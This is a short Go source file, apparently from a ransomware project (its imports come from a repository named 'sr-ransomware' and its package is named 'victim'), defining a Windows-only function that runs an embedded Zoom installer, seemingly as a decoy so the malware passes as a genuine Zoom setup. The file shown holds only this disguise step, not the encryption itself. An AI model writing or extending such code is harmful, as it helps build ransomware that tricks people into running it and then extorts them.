// +build windows,zoom

package victim

import (
    "github.com/sug0/sr-ransomware/go/exe"
    "github.com/sug0/sr-ransomware/go/errors"
)

func RunZoomInstaller() error {
    z := exe.NewZoom(zoomInstaller)
    return errors.WrapIfNotNil(pkg, "error during zoom installation", z.Run())
}
